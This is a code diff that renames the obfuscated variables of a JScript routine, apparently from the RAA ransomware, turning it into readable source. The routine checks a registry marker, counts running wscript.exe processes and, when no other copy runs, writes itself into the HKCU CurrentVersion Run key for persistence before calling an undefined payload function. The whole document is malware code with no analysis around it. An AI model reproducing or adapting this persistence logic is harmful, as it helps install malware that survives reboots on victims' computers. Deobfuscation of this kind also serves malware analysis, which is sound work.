@@ -1,38 +1,38 @@
-function zQqUzoSxLQ() {
+function createWindowsParts() {
     var QCY;
-    var kHkyz = WScript.CreateObject("WScript.Shell");
+    var runner = WScript.CreateObject("WScript.Shell");
     try {
-        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
+        runner.RegRead("HKCU\\RAA\\Raa-fnl\\");
     } catch (e) {
         QCY = 0;
     }
-    var lCMTwJKZ = [];
-    var baZk = "wscript.exe";
-    var AFtKLHIjDtkM = 0;
+    var parts = [];
+    var windowsScriptExec = "wscript.exe";
+    var counter = 0;
     var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
     for (; !e.atEnd(); e.moveNext()) {
         var p = e.item();
-        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
+        parts = parts + p.Name + ",";
     }
-    lCMTwJKZ = lCMTwJKZ.split(",");
-    var jcayrm = -1;
+    parts = parts.split(",");
+    var iterator = -1;
     do {
-        jcayrm += 1;
-        if (lCMTwJKZ[jcayrm] == baZk) {
-            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
+        iterator += 1;
+        if (parts[iterator] == windowsScriptExec) {
+            counter = counter + 1;
         } else {
             null
         }
-    } while (jcayrm < lCMTwJKZ.length);
-    if (AFtKLHIjDtkM < 2 && QCY == 0) {
-        var TKVUdGUkzCmE = WScript.ScriptFullName;
-        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
-        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
-        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
+    } while (iterator < parts.length);
+    if (counter < 2 && QCY == 0) {
+        var scriptFullName = WScript.ScriptFullName;
+        scriptFullName = scriptFullName + " argument";
+        var runner2 = WScript.CreateObject("WScript.Shell");
+        runner2.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", scriptFullName, "REG_SZ");
         HxBG();
     } else {
         null;
     }
     return 0;
 }
-zQqUzoSxLQ();
+createWindowsParts();
